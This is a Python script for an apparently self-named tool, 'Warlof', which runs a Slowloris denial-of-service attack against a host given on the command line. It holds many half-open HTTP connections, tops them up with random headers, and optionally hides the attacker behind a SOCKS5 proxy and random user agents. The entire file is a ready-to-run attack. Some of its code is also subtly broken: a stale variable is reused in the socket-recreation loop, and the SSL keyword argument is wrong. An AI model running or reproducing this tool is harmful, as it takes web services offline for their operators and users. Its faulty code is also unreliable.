#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import ssl
import socks
import time
from core.headers import *
from plugins.banner import *

bannerFunc()

# Parser
parser = argparse.ArgumentParser(description=f"{bold}{blue}Warlof {yellow} - Help Menu{reset}", usage="⏬⏬")

parser.add_argument("host", nargs="?", help=f"{cyan}- Domain Name or IP Address.")
parser.add_argument("-p", "--port", default=80, help=f"{cyan}Domain/IP Port Number", type=int)
parser.add_argument("-s","--sockets",default=200,help=f"{cyan}Number of Requests.",type=int)
parser.add_argument("-v","--verbose",dest="verbose",action="store_true",help=f"{cyan}Show attack details in terminal.")
parser.add_argument("-x","--useproxy",dest="useproxy",action="store_true",help=f"{cyan}Use SOCKS5 proxy for connecting.")
parser.add_argument("--proxy-host", default="127.0.0.1", help=f"{cyan}SOCKS5 proxy host.")
parser.add_argument("--proxy-port", default="8080", help=f"{cyan}SOCKS5 proxy port", type=int)
parser.add_argument("--https",dest="https",action="store_true",help=f"{cyan}Use HTTPS for the requests.")
parser.add_argument("-ua","--randuseragents",dest="randuseragent",action="store_true",help=f"{cyan}Randomizes user-agents with requests.",)
parser.add_argument("--sleeptime",dest="sleeptime",default=15,type=int,help=f"{cyan}Sleep time for every request..{reset}")

parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)

args = parser.parse_args()


if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    try:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(format="[%(asctime)s] %(message)s",datefmt="%d-%m-%Y %H:%M:%S",level=logging.DEBUG)
else:
    logging.basicConfig(format="[%(asctime)s] %(message)s",datefmt="%d-%m-%Y %H:%M:%S",level=logging.INFO)

def sendLineFunc(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def sendheaderFunc(self, name, value):
    self.sendLineFunc(f"{name} : {value}")

if args.https:
    logging.info("Using SSL Module")
    setattr(ssl.SSLSocket, "sendLineFunc", sendLineFunc)
    setattr(ssl.SSLSocket, "sendheaderFunc", sendheaderFunc)

listofRequests = []

setattr(socket.socket, "sendLineFunc", sendLineFunc)
setattr(socket.socket, "sendheaderFunc", sendheaderFunc)


def initRequestsFunc(ip):
    requestsVar = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    requestsVar.settimeout(4)

    if args.https:
        createDefaultContextVar = ssl.create_default_context()
        requestsVar = createDefaultContextVar.wrap_socket(requestsVar, serverHostName=args.host)

    requestsVar.connect((ip, args.port))
    requestsVar.sendLineFunc(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    sellectRandomUserAgent = userAgent[0]
    if args.randuseragent:
        sellectRandomUserAgent = random.choice(userAgent)

    requestsVar.sendheaderFunc("User-Agent", sellectRandomUserAgent)
    requestsVar.sendheaderFunc("Accept-language", "en-US,en,q=0.5")
    return requestsVar

# Main Function
def mainFunction():
    internetProtocol = args.host
    countNumberOfRequests = args.sockets
    logging.info(f"{bold}{purple}Attacking {red} [{internetProtocol}] {purple} with {countNumberOfRequests} sockets.{reset}")
    logging.info(f"{bold}{blue}\n\n~ Creating sockets ~\n{reset}")
    for BaseLoopVar in range(countNumberOfRequests):
        try:
            logging.debug(f"{orange}Sending Requests... {BaseLoopVar}{reset}")
            sendRequests = initRequestsFunc(internetProtocol)
        except socket.error as error:
            logging.debug(error)
            break
        listofRequests.append(sendRequests)

    # Create a while loop
    while True:
        try:
            logging.info(f"{bold}{blue}Sending requests... Socket count: {len(listofRequests)}{reset}")
            for requests in list(listofRequests):
                try:
                    requests.sendheaderFunc("X-a", random.randint(1, 5000))
                except socket.error:
                    listofRequests.remove(sendRequests)
            # Create a for loop 
            for BaseLoopVar in range(countNumberOfRequests - len(listofRequests)):
                logging.debug("Recreating socket...")
                try:
                    requestvarNum = initRequestsFunc(internetProtocol)
                    if requestvarNum:
                        listofRequests.append(sendRequests)
                except socket.error as error:
                    logging.debug(error)
                    break
            logging.debug(f"Sleeping for {args.sleeptime} seconds")
            time.sleep(args.sleeptime)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break


if __name__ == "__main__":
    try:
        mainFunction()
    except KeyboardInterrupt:
        print("Keyboard Interrupt Detected. Exiting...")
        quit()
